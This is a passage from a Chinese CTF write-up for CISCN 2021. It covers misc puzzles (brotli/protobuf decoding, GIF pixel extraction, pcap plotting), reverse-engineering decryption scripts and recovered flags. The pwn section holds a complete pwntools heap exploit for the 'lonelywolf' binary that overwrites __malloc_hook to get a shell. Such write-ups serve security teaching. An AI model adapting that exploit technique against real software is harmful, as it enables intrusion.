src="/article/ciscn2021/9CFC275D-3F65-48C5-A8BE-F9B67DDD610D.png" class="" title="9CFC275D-3F65-48C5-A8BE-F9B67DDD610D" loading="lazy"><p>发现三个关键部分</p><p>全部导出看看，解压<code>flag_wrapper</code>得到<code>CISCN&#123;&#125;</code></p><img src="/article/ciscn2021/image-20210516043809208.png" class="" title="image-20210516043809208" loading="lazy"><p>利用脚本解br发现proto3内容</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> brotli<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./test.br"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>content <span class="token operator">=</span> brotli<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span><span class="token string">"bw"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span></code></pre><img src="/article/ciscn2021/image-20210516052103002.png" class="" title="image-20210516052103002" loading="lazy"><p>导出<code>secret</code>内容如下</p><img src="/article/ciscn2021/image-20210516052229144.png" class="" title="image-20210516052229144" loading="lazy"><p>由此应该是用proto3协议来解密</p><p>根据教程<a href="https://www.cnblogs.com/luoxn28/p/5303517.html">https://www.cnblogs.com/luoxn28/p/5303517.html</a></p><p>安装环境后用其自带的decode方法，用test文件规定的解密规则将处理过的<code>secret</code>进行解密</p><img src="/article/ciscn2021/image-20210516054849721.png" class="" title="image-20210516054849721" loading="lazy"><p>有用的部分在<code>PBResponse</code></p><p>最后拼接flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">15100450</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"e2345"</span><span class="token operator">+</span><span class="token string">"7889b0"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">16453958</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"d172a38dc"</span></code></pre><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;e66a22e23457889b0fb1146d172a38dc&#125;</code></pre><hr><h3 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h3><p>下载为gif，Photoshop打开发现有几百帧，仔细观察发现每帧上有奇怪像素点，RGB值为(233,233,233)</p><img src="/article/ciscn2021/image-20210516045206693.png" class="" title="image-20210516045206693" loading="lazy"><p>利用convert进行抽帧</p><pre class="language-sh" data-language="sh"><code class="language-sh">convert .&#x2F;running_pixel.gif .&#x2F;output&#x2F;out%05d.png</code></pre><p>把每张图RGB(233,233,233)像素的坐标提取出来放文档里</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> ospath <span class="token operator">=</span> <span class="token string">"./output/"</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagewidth <span class="token operator">=</span> <span class="token number">400</span>height <span class="token operator">=</span> <span class="token number">400</span><span class="token keyword">def</span> <span class="token function">get_rgb</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>    pixel <span class="token operator">=</span> img<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>    coordinates <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    out_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./list.txt"</span><span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>            r<span class="token punctuation">,</span> g <span class="token punctuation">,</span>b <span class="token operator">=</span> pixel<span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span>            <span class="token keyword">if</span> r <span class="token operator">==</span> g <span class="token operator">==</span> b <span class="token operator">==</span> <span class="token number">233</span><span class="token punctuation">:</span>                coordinate <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span>                out_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>coordinate <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>                <span class="token comment"># print(r, g, b)</span>    <span class="token keyword">return</span> coordinates  <span class="token keyword">def</span> <span class="token function">get_files</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>path <span class="token operator">+</span> <span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> img  <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> pic_file <span class="token keyword">in</span> files<span class="token punctuation">:</span>        pic <span class="token operator">=</span> get_files<span class="token punctuation">(</span>pic_file<span class="token punctuation">)</span>        coors <span class="token operator">=</span> get_rgb<span class="token punctuation">(</span>pic<span class="token punctuation">)</span></code></pre><p>得到所有像素点后画图，使用现成脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDrawflag_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'list.txt'</span><span class="token punctuation">)</span>draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>flag_image<span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    point <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag_image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"./flag.png"</span><span class="token punctuation">)</span></code></pre><p>得到如下图</p><img src="/article/ciscn2021/image-20210516051514950.png" class="" title="image-20210516051514950" loading="lazy"><p>纯手动一点一点慢慢拼出了flag</p><img src="/article/ciscn2021/image-20210515184657362.png" class="" title="image-20210515184657362" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;12504d0f-9de1-4b00-87a5-a5fdd0986a00&#125;</code></pre><h3 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h3><p><code>strings cap.pcapng</code>可以看到有坐标轴，坐标轴为三维坐标，但由于z轴大多数为0，所以可以用二维画图，</p><img src="/article/ciscn2021/image-20210517144021953.png" class="" title="image-20210517144021953" loading="lazy"><p>直接用上面的脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDrawflag_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'zuobiao.txt'</span><span class="token punctuation">)</span>draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>flag_image<span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    point <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    flag_image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"./flag.png"</span><span class="token punctuation">)</span></code></pre><p>得到图片：</p><img src="/article/ciscn2021/image-20210517144052457.png" class="" title="image-20210517144052457" loading="lazy"><p>md5加密之后就得到flag：CISCN{d4f1fb80bc11ffd722861367747c0f10}</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="longlywolf"><a href="#longlywolf" class="headerlink" title="longlywolf"></a>longlywolf</h3><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> base64context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'linux'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./lonelywolf'</span><span class="token punctuation">)</span><span class="token comment">#p = remote('127.0.0.1',12345)</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./lonelywolf'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> binary<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x521</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span> payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x70</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f3d5</span><span class="token punctuation">,</span><span class="token number">0x4f432</span><span class="token punctuation">,</span><span class="token number">0x10a41c</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'malloc_hook'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  free<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h3><pre class="language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0xe3</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">,</span><span class="token number">0xbb</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0xc2</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0x9e</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0x5</span><span class="token punctuation">,</span><span class="token number">0x2</span><span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">,</span><span class="token number">0x8e</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0x4f</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0xaf</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0xea</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token number">0xd3</span><span class="token punctuation">,</span><span class="token number">0xcc</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token string">'12345678'</span>number <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    number<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> number<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    a <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    number<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span>    number<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token number">0</span>c <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    b <span class="token operator">=</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span>    c <span class="token operator">=</span> <span class="token punctuation">(</span>c <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    number<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> number<span class="token punctuation">[</span>c<span class="token punctuation">]</span>    number<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">=</span> b    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> number<span class="token punctuation">[</span><span class="token punctuation">(</span>b <span class="token operator">+</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><h3 id="babybc"><a href="#babybc" class="headerlink" title="babybc"></a>babybc</h3><p>用到 LLVM，再IDA打开</p><p>两个函数，写了各种限制</p><pre class="language-none"><code class="language-none">横row 0001 1000 2001 0000 1010map[0][3] &gt; map[0][4]map[1][0] &gt; map[1][1]map[2][0] &lt; map[2][1]map[2][3] &gt; map[2][4]map[4][0] &gt; map[4][1]map[4][2] &gt; map[4][3]纵col 00202 00000 00010 01001map[0][2] &gt; map[1][2]map[0][4] &gt; map[1][4]map[2][3] &lt; map[3][3]map[3][1] &lt; map[4][1]map[3][4] &lt; map[4][3]</code></pre><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python">num1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num5 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span 